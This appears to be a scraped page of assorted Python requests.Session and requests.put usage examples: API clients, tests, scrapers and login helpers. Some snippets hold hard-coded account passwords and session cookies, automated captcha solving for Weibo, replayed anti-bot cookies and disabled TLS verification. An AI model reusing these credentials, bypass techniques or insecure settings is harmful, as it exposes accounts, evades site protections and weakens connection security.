        if getattr(self, "_local_thread", None) is None:
            self._local_thread = _threading.local()

        # Store whatever session we use in the local thread storage
        if getattr(self._local_thread, "session", None) is None:
            self._local_thread.session = self._session or _requests.Session()

        return self._local_thread.session 
**************************************
def close(self):
        # type: None -> None
        session = self._get_session()
        if session:
            session.close()
            s = _requests.Session() 
**************************************
def __init__(self, path, *args, **kwargs):
        super(Session, self).__init__(*args, **kwargs)
        self._path = path
        self['headers'] = {}
        self['cookies'] = {}
        self['auth'] = {
            'type': None,
            'username': None,
            'password': None
        } 
**************************************
def __init__(self, endpoint: str, *args: Any, **kwargs: Any) -> None:
        """
        Args:
            endpoint: The server address.
        """
        super().__init__(*args, **kwargs)
        self.endpoint = endpoint
        # Make use of Requests' sessions feature
        self.session = Session()
        self.session.headers.update(self.DEFAULT_HEADERS) 
**************************************
def __init__(self, server, ssl_verify=True, token=None, ignore_system_proxy=False,
                 use_https_proxy=None, ssl_verify_hostname=True, use_http_proxy=None):
        """ Requires:
                server -    URL to the Carbon Black server.  Usually the same as
                            the web GUI.
                ssl_verify - verify server SSL certificate
                token - this is for CLI API interface
        """

        if not server.startswith("http"):
            raise TypeError("Server must be URL: e.g, http://cb.example.com")

        if token is None:
            raise TypeError("Missing required authentication token.")

        self.server = server.rstrip("/")
        self.ssl_verify = ssl_verify
        self.token = token
        self.token_header = {'X-Auth-Token': self.token}
        self.session = requests.Session()

        if not ssl_verify_hostname:
            self.session.mount("https://", HostNameIgnoringAdapter())

        self.proxies = {}
        if ignore_system_proxy:  # see https://github.com/kennethreitz/requests/issues/879
            self.proxies = {
                'no': 'pass'
            }
        else:
            if use_http_proxy:
                self.proxies['http'] = use_http_proxy
            if use_https_proxy:
                self.proxies['https'] = use_https_proxy 
**************************************
def __init__(self, api_key):
        self.session = Session()
        self.session.params = {'key': api_key} 
**************************************
def __init__(self, account, server ='https://bugzilla.mozilla.org'):
		self.account = account
		self.server = server
		self.session = requests.Session() 
**************************************
def post(str):
    session=requests.Session()
    #url="https://www.cnblogs.com/mvc/PostComment/Add.aspx"
    url='https://account.cnblogs.com/signin?returnUrl=https%3A%2F%2Fhome.cnblogs.com%2Fblog%2F'
    headers={
        "user-agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
    }
    res=session.get(url,headers=headers)
    token=re.search('name=__RequestVerificationToken type=hidden value=(.*?)>',res.text)[1]
    print(token)
    key=re.search('name=PublicKey value=(.*?)>',res.text)[1]
    print(key)
    data1={
        'LoginName':'zy123451',
        'Password':'zy415320.',
        '__RequestVerificationToken':token,
        'PublicKey':key
    }
    session.post(url,headers=headers,data=data1)

    data={
    'blogApp':"xiaoxiaotank",
    'body':str,
    'parentCommentId':'0',
    'postId':'11078571'
    }
    cookie={
    "cookie":"_ga=GA1.2.158148253.1558313715; __gads=ID=2043acc179f4021b:T=1558313717:S=ALNI_MYgVO4530KXKAD9xjm_j-KTRR2Wlg; _gid=GA1.2.589494181.1562637111; .Cnblogs.AspNetCore.Cookies=CfDJ8D8Q4oM3DPZMgpKI1MnYlrlW4lTc59EvgWOGRw7qH00UJpXPH0E-YVENWsf0ULemiPSzMMhfz04A8ndbfiUBTt5DOAiaTKilh7AgZe0PIw45E_pOEim9YOy2V-kV64U18T-QGkcqWVGCtAGQFC3SgnCtYqbYqsvrJaUCfkkHeKkgEVIbNHWX3mExbVM7XfbUyMHjyr4nPSLAh8cXkhHFM6S_JX8wnoQIIXAV0g3E24YGgTJVPDUtItrhadprWB9vx2APQRCd_JRogM1ZqVOwHaM7AfGRh-TeyGxHX4Dkj07xcLx1KJIykA--lnlul0-1h1ysW8IRSiGER2YJdWjsd_Hqgpl_g9eubSfgRqeeh4-n5k6JGZRyQyCY5ZEEoNln_Pn31irPsrppNsavByLarFbH_RLboie_SGWzoLovriu814kATjX6M39jc_e76keJ3A; .CNBlogsCookie=41BDBE3C536D3FB0AD9CDB403AE27910026F844DD834B6A31EF2154CE046DB784D0ECF43E797C955DA44B8B5707AD0366C80E7092FAA258AD761E874CD52AF80A42620426B53861431CF4C3F165FA033731352F6; _gat=1"
    }
    aaurl = "https://www.cnblogs.com/mvc/PostComment/Add.aspx"
    a=requests.post(aaurl,data=data,cookies=cookie,headers=headers)
    print(a.json()) 
**************************************
def test_nonexistent_collection(self):

        logger = logging.getLogger(__name__)
        requests_cache.install_cache(cachefile, backend='sqlite')
        session = requests.Session()

        aic = ArchiveItCollection(2, session=session, logger=logger)

        metadata = aic.return_collection_metadata_dict()

        self.assertFalse(metadata["exists"])
        self.assertEqual(metadata["id"], '2')

        self.assertFalse(aic.does_exist()) 
**************************************
def test_private_collection_12(self):

        logger = logging.getLogger(__name__)
        requests_cache.install_cache(cachefile, backend='sqlite')
        session = requests.Session()

        aic = ArchiveItCollection(12, session=session, logger=logger)

        metadata = aic.return_collection_metadata_dict()
        
        self.assertEqual(metadata["name"], "state minnesota sites")
        self.assertEqual(metadata["uri"], "https://archive-it.org/collections/12")
        self.assertEqual(metadata["collected_by"], "Demo Account #1")
        self.assertEqual(metadata["collected_by_uri"], "https://archive-it.org/organizations/3")
        self.assertEqual(metadata["description"], "No description.")

        self.assertEqual(metadata["subject"],
            [
                "historical"
            ]
        )

        self.assertEqual(metadata["archived_since"], "Sep, 2005")

        metadata_fields = aic.list_optional_metadata_fields()

        self.assertTrue("collector" in metadata_fields)

        self.assertEqual(aic.get_optional_metadata("collector"), [ "Demo Account #1" ])

        self.assertTrue(aic.is_private())
        self.assertTrue(aic.does_exist())

        seed_metadata = aic.return_seed_metadata_dict()

        self.assertEqual(seed_metadata["seed_metadata"], {}) 
**************************************
def test_public_collection_6820(self):

        logger = logging.getLogger(__name__)
        requests_cache.install_cache(cachefile, backend='sqlite')
        session = requests.Session()

        aic = ArchiveItCollection(6820, session=session, logger=logger)

        metadata = aic.return_collection_metadata_dict()

        self.assertTrue(metadata["exists"])
        self.assertEqual(metadata["id"], '6820')

        self.assertEqual(metadata["name"], "Congressional Budget Office")
        self.assertEqual(metadata["uri"], "https://archive-it.org/collections/6820")
        self.assertEqual(metadata["collected_by"], "Federal Depository Library Program Web Archive")
        self.assertEqual(metadata["collected_by_uri"], "https://archive-it.org/organizations/593")
        self.assertEqual(metadata["description"],
            """Since 1975, CBO has produced independent analyses of budgetary and economic issues to support the Congressional budget process. Each year, the agency’s economists and budget analysts produce dozens of reports and hundreds of cost estimates for proposed legislation. CBO is strictly nonpartisan; conducts objective, impartial analysis; and hires its employees solely on the basis of professional competence without regard to political affiliation."""
            )

        self.assertEqual(metadata["subject"],
            [
                "Government - US Federal",
                "American History & Political Science",
                "Economics & Finance"
            ]
        )
        self.assertEqual(metadata["archived_since"], "Jan, 2016")

        metadata_fields = aic.list_optional_metadata_fields()

        self.assertTrue("language" in metadata_fields)
        self.assertTrue("collector" in metadata_fields)

        self.assertEqual(aic.get_optional_metadata("language"), [ "English" ])
        self.assertEqual(aic.get_optional_metadata("collector"), [ "U.S. Government Publishing Office" ])

        self.assertFalse(aic.is_private())
        self.assertTrue(aic.does_exist()) 
**************************************
def __init__(self, collection_id, session=requests.Session(), logger=None):

        self.collection_id = str(collection_id)
        self.session = session
        self.metadata_loaded = False
        self.seed_metadata_loaded = False
        self.metadata = {}
        self.seed_metadata = {}
        self.private = None
        self.exists = None

        self.collection_uri = "{}/{}".format(collection_uri_prefix, collection_id)
        self.firstpage_response = self.session.get(self.collection_uri)        

        self.logger = logger or logging.getLogger(__name__) 
**************************************
def __init__(self, token, url, version):
        self.version = version
        self.header = {
            "Authorization": "Bearer {}".format(token)
        }
        self.baseUrl = url
        self.session = requests.Session()
        self.session.headers.update(self.header)
        self.set_user_agent("?") 
**************************************
def getcookies(user, passwd):
    # 获取验证码
    sign = random.random()
    url = "https://captcha.weibo.com/api/pattern/get?ver=daf139fb2696a4540b298756bd06266a&source=ssologin&usrname=" + user + "&line=160&side=100&radius=30&_rnd=" + str(
        sign) + "&callback=pl_cb"
    r = requests.get(url)
    imgdata = json.loads(r.text.replace("pl_cb(", '').replace(")", ''))['path_enc']
    id = json.loads(r.text.replace("pl_cb(", '').replace(")", ''))['id']
    recombinePattern(imgdata)
    data_enc = pathdataEncode(path_generate(patterntohash()))
    path_enc = pathEncode(patterntohash(), id)

    url2 = "https://captcha.weibo.com/api/pattern/verify?ver=daf139fb2696a4540b298756bd06266a&id=" + id + "&usrname=" + user + "&source=ssologin&path_enc=" + path_enc + "&data_enc=" + data_enc + "&callback=pl_cb"
    url3 = 'https://passport.weibo.cn/sso/login'
    # 必要的等待时间
    time.sleep(1)
    # 验证验证码
    session = requests.Session()
    r2 = session.get(url2)
    # print r2.headers
    print json.loads(r2.text.replace("pl_cb(", '').replace(")", ''))['msg']
    # print id

    formdata = {'username': user,
                'password': passwd,
                'savestate': '1',
                'ec': '0',
                'entry': 'mweibo',
                'mainpageflag': '1',
                'vid': id,
                'wentry': '',
                'loginfrom': '',
                'client_id': '',
                'code:qq': '',
                'r': '',
                'pagerefer': '',
                'hff': '',
                'hfp': ''}

    # print formdata['vid']
    # 登录
    r3 = session.post(url3, data=formdata, headers=headers3)
    cookies_url = r3.headers['Set-Cookie']
    print json.loads(r3.content)['msg']
    return {k.split('=')[0]: k.split('=')[1] for k in cookies_url.split(';')}

    # r4 = requests.get('https://m.weibo.cn/')
    # print r4.headers['Set-Cookie'] 
**************************************
def main(argv):
    try:
        old_config = None
        while True:
            params = {
                'vhosts': {},
            }

            s = requests.Session()
            apps = json.loads(s.get('http://master.mesos:8080/v2/apps').text)
            for app in apps['apps']:
                try:
                    vhost = app['labels']['VIRTUAL_HOST']
                except KeyError:
                    continue
                tasks = json.loads(s.get('http://master.mesos:8080/v2/apps%s/tasks' % app['id'],
                                         headers={'Accept': 'application/json'}).text)
                backends = []
                for task in tasks['tasks']:
                    try:
                        ip = socket.gethostbyname(task['host'])
                    except socket.gaierror:
                        print "Can't look up host %s" % task['host']
                        continue
                    backends.append('%s:%s' % (ip, task['ports'][0]))
                if backends:
                    params['vhosts'][vhost] = {
                        'backends': backends,
                    }

            template = Template(TEMPLATE)
            new_config = template.render(params)
            if new_config != old_config:
                with file('/etc/nginx/sites-available/default', 'w') as fh:
                    fh.write(new_config)
                test = subprocess.Popen(['/usr/sbin/nginx', '-t'], stderr=subprocess.PIPE)
                output = test.communicate()
                if test.returncode != 0:
                    if old_config:
                        print 'Error generating new NGINX configuration, not reloading'
                        return
                    else:
                        raise RuntimeError('Error generating NGINX configuration')
                subprocess.call(['/usr/sbin/nginx', '-s', 'reload'])
                old_config = new_config
            time.sleep(10)
    except KeyboardInterrupt:
        return 1 
**************************************
def login(self, username, password):
        """
        # 新浪微博登录
        :param username: 微博手机号
        :param password: 微博密码
        :return:
        """
        if username == "" or password == "":
            raise StockMatchError("用户名或密码不能为空")
        post_data = {
            "entry": "finance",
            "gateway": "1",
            "from": None,
            "savestate": "30",
            "qrcode_flag": True,
            "useticket": "0",
            "pagerefer": "http://jiaoyi.sina.com.cn/jy/index.php",
            "vsnf": "1",
            "su": base64.b64encode(username.encode("utf-8")).decode("utf-8"),
            "service": "sso",
            "servertime": get_unix_timestamp(False),
            "nonce": "RA12UM",
            # "pwencode": "rsa2",  # 取消掉使用rsa2加密密码
            "sp": password,
            "sr": "1280*800",
            "encoding": "UTF-8",
            "cdult": "3",
            "domain": "sina.com.cn",
            "prelt": "56",
            "returntype": "TEXT",
        }
        session = requests.Session()
        session.headers.update(conf.SINA_CONFIG["request_headers"])
        res = session.post(conf.SINA_CONFIG["login_url"], data=post_data, params={
            "client": "ssologin.js(v1.4.19)",
            "_": get_unix_timestamp(),
        })
        res.encoding = "gb2312"
        info = json.loads(res.content)
        if info["retcode"] != "0":
            logger.error(info["reason"])
            raise LoginFailedError(info["reason"])
        logger.info("用户%s登录成功" % username)
        return session, info['uid'] 
**************************************
def __init__(self,
                 issuer=None,
                 provider_metadata=None,
                 userinfo_http_method='GET',
                 client_registration_info=None,
                 client_metadata=None,
                 auth_request_params=None,
                 session_refresh_interval_seconds=None,
                 requests_session=None):
        """
        Args:
            issuer (str): OP Issuer Identifier. If this is specified discovery will be used to fetch the provider
                metadata, otherwise `provider_metadata` must be specified.
            provider_metadata (ProviderMetadata): OP metadata,
            userinfo_http_method (Optional[str]): HTTP method (GET or POST) to use when sending the UserInfo Request.
                If `none` is specified, no userinfo request will be sent.
            client_registration_info (ClientRegistrationInfo): Client metadata to register your app
                dynamically with the provider. Either this or `registered_client_metadata` must be specified.
            client_metadata (ClientMetadata): Client metadata if your app is statically
                registered with the provider. Either this or `client_registration_info` must be specified.
            auth_request_params (dict): Extra parameters that should be included in the authentication request.
            session_refresh_interval_seconds (int): Length of interval (in seconds) between attempted user data
                refreshes.
            requests_session (requests.Session): custom requests object to allow for example retry handling, etc.
        """

        if not issuer and not provider_metadata:
            raise ValueError("Specify either 'issuer' or 'provider_metadata'.")

        if not client_registration_info and not client_metadata:
            raise ValueError("Specify either 'client_registration_info' or 'client_metadata'.")

        self._issuer = issuer
        self._provider_metadata = provider_metadata

        self._client_registration_info = client_registration_info
        self._client_metadata = client_metadata

        self.userinfo_endpoint_method = userinfo_http_method
        self.auth_request_params = auth_request_params or {}
        self.session_refresh_interval_seconds = session_refresh_interval_seconds

        self.requests_session = requests_session or requests.Session() 
**************************************
def send_request(url, method='GET', headers=None, param_get=None, data=None):
    """实际发送请求到目标服务器, 对于重定向, 原样返回给用户
    被request_remote_site_and_parse()调用"""
    final_hostname = urlsplit(url).netloc
    dbgprint('FinalRequestUrl', url, 'FinalHostname', final_hostname)
    # Only external in-zone domains are allowed (SSRF check layer 2)
    if final_hostname not in allowed_domains_set and not developer_temporary_disable_ssrf_prevention:
        raise ConnectionAbortedError('Trying to access an OUT-OF-ZONE domain(SSRF Layer 2):', final_hostname)

    # set zero data to None instead of b''
    if not data:
        data = None

    prepped_req = requests.Request(
        method,
        url,
        headers=headers,
        params=param_get,
        data=data,
    ).prepare()

    # get session
    if enable_connection_keep_alive:
        _session = connection_pool.get_session(final_hostname)
    else:
        _session = requests.Session()

    # Send real requests
    parse.time["req_start_time"] = time()
    r = _session.send(
        prepped_req,
        proxies=requests_proxies,
        allow_redirects=False,
        stream=enable_stream_content_transfer,
        verify=not developer_do_not_verify_ssl,
    )
    # remote request time
    parse.time["req_time_header"] = time() - parse.time["req_start_time"]
    dbgprint('RequestTime:', parse.time["req_time_header"], v=4)

    # Some debug output
    # print(r.request.headers, r.headers)
    if verbose_level >= 3:
        dbgprint(r.request.method, "FinalSentToRemoteRequestUrl:", r.url, "\nRem Resp Stat: ", r.status_code)
        dbgprint("RemoteRequestHeaders: ", r.request.headers)
        if data:
            dbgprint('RemoteRequestRawData: ', r.request.body)
        dbgprint("RemoteResponseHeaders: ", r.headers)

    return r 
**************************************
def data_Crawling(from_h,to_h,date_h):
    #创建回话，用于重定向，用于三次请求在一个会话中
    s = requests.Session()
    #超时异常处理，若是超时将等待6分钟
    try:
        #第一次请求
        #response0 = s.get("http://data.cn.coremetrics.com/cm?ci=90409626&st=1466388314288&vn1=4.15.18&ec=utf-8&pi=new-step1_flightChoose&ul=http%3A%2F%2Fwww.shenzhenair.com&cjen=1&cjuid=57398592835414660835879&cjsid=1466388133&cjvf=1&tid=8&ti=1466388338458&hr=%2Fservlet%2FSearchEngineServlet%3Fpc%3D"+from_h+"%26pd%3D"+to_h+"%26pe%3D"+date_h+"%26oriPage%3Duiue",headers=headers)
        response = s.get("http://www.shenzhenair.com/servlet/SearchEngineServlet?pc="+from_h+"&pd="+to_h+"&pe="+date_h+"&oriPage=uiue",headers=headers1,timeout=15)

        #第二次请求
        url = 'http://www.shenzhenair.com/uiue/flightSearch.do?waf_search_token=szair&operate=flightSearch&originalPage=loading'
        data = {'waf_search_token': 'szair',
                'originalPage': 'loading',
                'operate': 'flightSearch'}
        response1 = s.get('http://www.shenzhenair.com/uiue/flightSearch.do?operate=toLoading&originalPage=login'
                        ,headers=headers1,timeout=15)
        #print response1.status_code
        time.sleep(1)
        #response3 = s.get( 'http://data.cn.coremetrics.com/cm?ci=90409626&st=1463492988375&vn1=4.15.18&ec=utf-8&vn2=e4.0&pi=new-bookFlightLoading&ul=http%3A%2F%2Fwww.shenzhenair.com%2Fuiue%2FflightSearch.do%3Foperate%3DtoLoading%26originalPage%3Dlogin&cjen=1&cjuid=84891504478414626697084&cjsid=1463488973&cjvf=1&tid=1&cg=Flights&rnd=1463499547693',headers=headers,timeout=30)
        #time.sleep(3)
        #第三次请求
        data = re.search(r'\'cookie\' : \"(.*?)\",',response1.text)
        #print data.group(1)
        #print s.cookies
        headers4 = {
        'Accept': 'text/html, application/xhtml+xml, */*',
        'Referer': 'http://www.shenzhenair.com/uiue/flightSearch.do?operate=toLoading&originalPage=login',
        'Accept-Language': 'zh-CN',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
        'Cookie':'90409626_clogin=l=1466669827&v=1&e=1466671633403; RadwareP=BQQAeDLICwr6TbMa8P3sBQ$$; verynginx_sign_cookie=21edd0522f8b10155285c7a9f3e98a51; userid_hash=CgtvTFdrPOxfU3YZBTeCAg==; route=ab8f2b4b0aac13fa8231e67aa418e142; JSESSIONID=00006SQbEuUUW_3KCzGcW5sjluw:-1; sessionid_hash=b8b55026eab01d0fa676d7d9109c6646; cmTPSet=Y; verynginx_sign_javascript='+data.group(1),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'www.shenzhenair.com',
        #'Content-Length': 64,
        'Connection': 'Keep-Alive',
        'Pragma': 'no-cache'
        }
        response2 = s.post(url,headers=headers4,timeout=15)
        
        response2 = s.post(url,headers=headers4,timeout=15)
        #response2 = s.post(url,timeout=15)
        #print response2.status_code
        return response2.text,response2.cookies
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2

# 解析数据 
**************************************
def send_to_kannel( msg = {}, preferred_kannel_server = None):
    '''sends a given messages to the _RIGHT_ kannel server'''
    server = None
    if preferred_kannel_server is not None:
        try:
            server = KANNEL_SERVERS[preferred_kannel_server.lower()] #locate using ip
        except KeyError as ke:
            server = KANNEL_SERVERS['DEFAULT_KANNEL_SERVER']
    else: #no preferred server was given, select the proper one based on the recipient number
    
        for s,s_info in KANNEL_SERVERS.items():
            prefixes = s_info['series']
            logger.debug("Server %s supports all numbers with the prefixes %s", s, prefixes)
            for p in prefixes:
                recipient = msg['to'].strip('+')
                logger.debug("Trying to match %s with prefix %s ", recipient, p)
                if recipient.startswith(p): #this is our number series
                    server = s_info 
                    logger.debug("Selected server %s with prefix (%s) matching with recipient number %s", server, prefixes,recipient)
                    break;

            if server is not None: #we have found our server!
                break;

    if server is None:
        logger.error("Could not select any server for forwarding message! Check logs.")
        return (False, 500, '')

    try:
        #compose the complete Request with URL and data for sending sms
        session = Session()

        request = session.prepare_request(compose_request_for_kannel(msg, server))
        logger.debug("Calling %s with data %s", request.url, request.body)
        response = session.send(request)

        print response.status_code
        print response.text
        logger.debug("Received response code %s with text %s", response.status_code, response.text)
        logger.debug("Result is %s %s ", response.status_code, response.text)
        exc_info = sys.exc_info()

        return (True, response.status_code, response.text)
    except requests.ConnectionError as ce:
        exc_info = sys.exc_info()
        logger.critical("Problem while connecting to the server!")
        logger.exception(ce)

        return (False, response.status_code, response.text)
    finally:
        exc_info = sys.exc_info()
        traceback.print_exception(*exc_info)
        del exc_info 
**************************************
def get_response(session_name, requests_kwargs, config_dir, args,
                 read_only=False):
    """Like `client.get_response`, but applies permanent
    aspects of the session to the request.

    """
    if os.path.sep in session_name:
        path = os.path.expanduser(session_name)
    else:
        hostname = (
            requests_kwargs['headers'].get('Host', None)
            or urlsplit(requests_kwargs['url']).netloc.split('@')[-1]
        )

        assert re.match('^[a-zA-Z0-9_.:-]+$', hostname)

        # host:port => host_port
        hostname = hostname.replace(':', '_')
        path = os.path.join(config_dir,
                            SESSIONS_DIR_NAME,
                            hostname,
                            session_name + '.json')

    session = Session(path)
    session.load()

    request_headers = requests_kwargs.get('headers', {})
    requests_kwargs['headers'] = dict(session.headers, **request_headers)
    session.update_headers(request_headers)

    if args.auth:
        session.auth = {
            'type': args.auth_type,
            'username': args.auth.key,
            'password': args.auth.value,
        }
    elif session.auth:
        requests_kwargs['auth'] = session.auth

    requests_session = requests.Session()
    requests_session.cookies = session.cookies

    try:
        response = requests_session.request(**requests_kwargs)
    except Exception:
        raise
    else:
        # Existing sessions with `read_only=True` don't get updated.
        if session.is_new or not read_only:
            session.cookies = requests_session.cookies
            session.save()
        return response 
**************************************
def emomeLogin(username, password):
    url = "http://websms1.emome.net/sms/sendsms/new.jsp?msg="
    authUrl = "https://member.cht.com.tw/HiReg/multiauthentication"
    confirmUrl = "https://member.cht.com.tw/HiReg/redirect?m=logininfo"

    s = requests.Session()
    r = s.get(url)

    if r.history:
        content = r.text
        match = re.search(".*checksum.*value=\"(?P<checksum>[a-f0-9]+)\"/>", content)
        if match:
            checksum = match.group("checksum")
            postfield = {
                          "version": "1.0",
                          "curl": "http://auth.emome.net/emome/membersvc/AuthServlet",
                          "siteid": "76",
                          "sessionid": "",
                          "channelurl": "http://auth.emome.net/emome/",
                          "others": "5235",
                          "checksum": checksum,
                          "cp_reg_info": "",
                          "reg_url": "",
                          "service_type": "",
                          "finish_channelurl": "",
                          "formtype": "",
                          "sso": "yes",
                          "uid": username,
                          "pw": password
                        }
            r = s.post(authUrl, data = postfield)
            r = s.get(confirmUrl)
            r = s.get(url)
            if r.text.find(u"訊息內容") > 0:
                print "Login Successfully! We can send SMS now"
                return s
            else:
                print "Unable to retrieve Emome WebSMS interface"
                return False
        else:
            print "Something wrong with Emome authentication!"
            return False
    else:
        print "Unable to open Emome website"
        return False 
**************************************
def download_live(target_room_id):
    if not os.path.exists(os.path.join(ptts.dl_path, ptts.tt_target_user, 'broadcasts')):
        os.makedirs(os.path.join(ptts.dl_path, ptts.tt_target_user, 'broadcasts'))

    download_path = os.path.join(ptts.dl_path, ptts.tt_target_user, 'broadcasts')
    logger.separator()
    logger.info("Checking for ongoing livestreams.")
    logger.separator()
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
    })
    r = s.get(Constants.LIVE_WEB_URL.format(target_room_id))
    r.raise_for_status()
    live = r.text
    live_room_id = re.search(r'(stream-)(.*)(?=\/playlist)', live)
    if live_room_id:
        live_hls_url = Constants.LIVE_HLS_ENDP.format(live_room_id[2])
        logger.info("HLS url: {:s}".format(live_hls_url))
        logger.separator()
        logger.info("HLS url retrieved. Calling youtube-dl.")
        helpers.call_ytdl(live_hls_url, os.path.join(download_path, str(live_room_id[2]) + "_" + ptts.epochtime))
    else:
        logger.info("There is no available livestream for this user.")
        logger.separator()




    ### NEEDS LOGIN BUT IS BROKEN ###

    # if not os.path.exists(os.path.join(ptts.dl_path, ptts.tt_target_user, 'broadcasts')):
    #     os.makedirs(os.path.join(ptts.dl_path, ptts.tt_target_user, 'broadcasts'))
    #
    # download_path = os.path.join(ptts.dl_path, ptts.tt_target_user, 'broadcasts')
    # logger.separator()
    # logger.info("Checking for ongoing livestreams.")
    # logger.separator()
    # json_data = api.user_post_feed(user_id=target_user_id, max_cursor=0)
    # if  json_data.get("aweme_list"):
    #     live_room_id = json_data.get("aweme_list")[0].get('author', None).get('room_id', None)
    #     if live_room_id:
    #         logger.info("Livestream available, getting information and beginning download.")
    #         logger.separator()
    #         live_json = api.get_live_feed(live_room_id)
    #         live_hls_url = Constants.LIVE_HLS_ENDP.format(live_json.get('room').get('stream_url').get('sid'))
    #         logger.info("HLS url retrieved. Calling youtube-dl.")
    #         helpers.call_ytdl(live_hls_url, os.path.join(download_path, str(live_room_id) + "_" + ptts.epochtime))
    #     else:
    #         logger.info("There is no available livestream for this user.")
    #         logger.separator()
    # else:
    #     logger.info("There is no available livestream for this user.")
    #     logger.separator() 

Python requests.put() Examples

**************************************
def _send_raw_http_request(self, method, url, data=None):
        self.__logger.debug('%s %s' % (method, url))
        if method in ['POST', 'PUT', 'PATCH']:
            self.__logger.log(TINTRI_LOG_LEVEL_DATA, 'Data: %s' % data)

        headers = {'content-type': 'application/json'}
        if self.__session_id:
            headers['cookie'] = 'JSESSIONID=%s' % self.__session_id

        if method in ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']:
            if method == 'GET': httpresp = requests.get(url, headers=headers, verify=False)
            elif method == 'POST': httpresp = requests.post(url, data, headers=headers, verify=False)
            elif method == 'PUT': httpresp = requests.put(url, data, headers=headers, verify=False)
            elif method == 'PATCH': httpresp = requests.patch(url, data, headers=headers, verify=False)
            elif method == 'DELETE': httpresp = requests.delete(url, headers=headers, verify=False)
            self._httpresp = httpresp # self._httpresp is for debugging only, not thread-safe
            return httpresp
        else:
            raise TintriError(None, message='Invalid HTTP method: ' + method) # This should never happen 
**************************************
def put_well_data(container_id, well_index, data_obj, headers=None, org_name=None,container_json=None):
    """Update a well with new data"""
    
    initialize_config()
        
    headers = headers if headers else TSC_HEADERS
    org_name = org_name if org_name else ORG_NAME    
    
    def _well_url(container_id, well_index):
        return 'https://secure.transcriptic.com/{}/inventory/samples/{}/{}'.format(org_name, container_id, well_index)

    headers['content-type'] = 'application/json'
   
    response = requests.put(_well_url(container_id, well_index), headers=headers,
                            data=json.dumps(data_obj),
                            verify=False
                            )
    
    response.raise_for_status() 
**************************************
def notify_party_and_respondent_account_locked(respondent_id, email_address, status=None):
    logger.info('Notifying respondent and party service that account is locked')
    url = f'{app.config["PARTY_URL"]}/party-api/v1/respondents/edit-account-status/{respondent_id}'

    data = {
        'respondent_id': respondent_id,
        'email_address': email_address,
        'status_change': status
    }

    response = requests.put(url, json=data, auth=app.config['PARTY_AUTH'])

    try:
        response.raise_for_status()
    except requests.exceptions.HTTPError:
        logger.error('Failed to notify party', respondent_id=respondent_id, status=status)
        raise ApiError(logger, response)

    logger.info('Successfully notified respondent and party service that account is locked', respondent_id=respondent_id, status=status) 
**************************************
def changeAlbumName(self,gid,name,albumId):
        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct": self.channel_access_token,

        }
        payload = {
            "title": name
        }
        r = requests.put(
            "http://" + self.host + "/mh/album/v3/album/" + albumId + "?homeId=" + gid,
            headers = header,
            data = json.dumps(payload),
        )
        return r.json() 
**************************************
def _publish(etag):
  """Publish local template to Firebase server.

  Args:
    etag: ETag for safe (avoid race conditions) template updates.
        * can be used to force template replacement.
  """
  with open('config.json', 'r', encoding='utf-8') as f:
    content = f.read()
  headers = {
    'Authorization': 'Bearer ' + _get_access_token(),
    'Content-Type': 'application/json; UTF-8',
    'If-Match': etag
  }
  resp = requests.put(REMOTE_CONFIG_URL, data=content.encode('utf-8'), headers=headers)
  if resp.status_code == 200:
    print('Template has been published.')
    print('ETag from server: {}'.format(resp.headers['ETag']))
  else:
    print('Unable to publish template.')
    print(resp.text) 
**************************************
def changeAlbumName(self,gid,name,albumId):
        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct": self.channel_access_token,

        }
        payload = {
            "title": name
        }
        r = requests.put(
            "http://" + self.host + "/mh/album/v3/album/" + albumId + "?homeId=" + gid,
            headers = header,
            data = json.dumps(payload),
        )
        return r.json() 
**************************************
def run(self):
        try:
            self.sse = ClosableSSEClient(self.url)
            for msg in self.sse:
                event = msg.event
                if event is not None and event in ('put', 'patch'):
                    response = json.loads(msg.data)
                    if response is not None:
                        # Default to CHILD_CHANGED event
                        occurred_event = FirebaseEvents.CHILD_CHANGED
                        if response['data'] is None:
                            occurred_event = FirebaseEvents.CHILD_DELETED

                        # Get the event I'm trying to listen to
                        ev = FirebaseEvents.id(self.event_name)
                        if occurred_event == ev or ev == FirebaseEvents.CHILD_CHANGED:
                            self.callback(event, response)
        except socket.error:
            pass 
**************************************
def keepalive_listen_key(self, listen_key):
        """
        Ping a listenkey to keep it alive

        :param listen_key: the listenkey you want to keepalive
        :type listen_key: str

        :return: the response
        :rtype: str or False
        """
        logging.debug("BinanceWebSocketApiRestclient->keepalive_listen_key(" + str(listen_key) + ")")
        method = "put"
        try:
            return self._request(method, self.path_userdata, False, {'listenKey': str(listen_key)})
        except KeyError:
            return False
        except TypeError:
            return False 
**************************************
def on_teams_file_consent_accept(
            self,
            turn_context: TurnContext,
            file_consent_card_response: FileConsentCardResponse
    ):
        """
        The user accepted the file upload request.  Do the actual upload now.
        """

        file_path = "files/" + file_consent_card_response.context["filename"]
        file_size = os.path.getsize(file_path)

        headers = {
            "Content-Length": f"\"{file_size}\"",
            "Content-Range": f"bytes 0-{file_size-1}/{file_size}"
        }
        response = requests.put(
            file_consent_card_response.upload_info.upload_url, open(file_path, "rb"), headers=headers
        )

        if response.status_code != 200:
            await self._file_upload_failed(turn_context, "Unable to upload file.")
        else:
            await self._file_upload_complete(turn_context, file_consent_card_response) 
**************************************
def send_response(event, context, status, reason, data):
    import requests

    body = json.dumps(
        {
            'Status': status,
            'RequestId': event['RequestId'],
            'StackId': event['StackId'],
            'PhysicalResourceId': context.log_stream_name,
            'Reason': reason,
            'LogicalResourceId': event['LogicalResourceId'],
            'Data': data
        }
    )

    headers = {
        'content-type': '',
        'content-length': len(body)
    }

    r = requests.put(event['ResponseURL'], data=body, headers=headers) 
**************************************
def setupDomain(domain, folder=False):
    endpoint = config.get("hsds_endpoint")
    headers = getRequestHeaders(domain=domain)
    req = endpoint + "/"
    rsp = requests.get(req, headers=headers)
    if rsp.status_code == 200:
